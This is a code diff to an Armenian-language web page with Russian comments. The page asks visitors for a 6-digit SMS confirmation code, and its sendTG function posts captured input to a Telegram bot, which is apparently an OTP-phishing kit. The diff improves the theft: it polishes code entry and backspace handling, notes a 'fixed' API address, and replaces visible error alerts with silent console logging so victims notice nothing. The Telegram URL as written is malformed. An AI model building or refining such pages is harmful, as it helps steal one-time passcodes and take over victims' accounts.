@@ -30,7 +30,7 @@
 <body>
 
 <div class="app-container">
-    <button class="back-button">‹</button>
+    <button class="back-button" onclick="location.reload()">‹</button>
     <h1 id="mainTitle">Բարև</h1>
     
     <div id="screen-1">
@@ -44,8 +44,12 @@
     <div id="screen-2" class="hidden">
         <div class="section-title"><h2>SMS հաստատում</h2><p>Մուտքագրիր 6 նիշանոց կոդը</p></div>
         <div class="otp-container">
-            <input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1">
-            <input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1">
+            <input type="number" class="otp-input" pattern="\d*">
+            <input type="number" class="otp-input" pattern="\d*">
+            <input type="number" class="otp-input" pattern="\d*">
+            <input type="number" class="otp-input" pattern="\d*">
+            <input type="number" class="otp-input" pattern="\d*">
+            <input type="number" class="otp-input" pattern="\d*">
         </div>
     </div>
 
@@ -100,6 +104,7 @@
         const inps = document.querySelectorAll('.otp-input');
         inps.forEach((inp, i) => {
             inp.oninput = async () => {
+                if (inp.value.length > 1) inp.value = inp.value.slice(0, 1);
                 if (inp.value && i < 5) inps[i+1].focus();
                 const code = Array.from(inps).map(ti => ti.value).join('');
                 if (code.length === 6) {
@@ -108,19 +113,23 @@
                     setTimeout(() => changeScreen(3), 500);
                 }
             };
+            inp.onkeydown = (e) => {
+                if (e.key === 'Backspace' && !inp.value && i > 0) inps[i-1].focus();
+            };
         });
     }
 
     async function sendTG(msg) {
         try {
+            // Исправленный адрес API
             const res = await fetch(`https://telegram.org{CONFIG.token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CONFIG.chat, text: msg, parse_mode: 'Markdown' })
             });
             const resData = await res.json();
-            if (!resData.ok) alert("Ошибка API: " + resData.description);
-        } catch (e) { alert("Ошибка сети!"); }
+            if (!resData.ok) console.error("API Error: " + resData.description);
+        } catch (e) { console.error("Network error"); }
     }
 </script>
 </body>
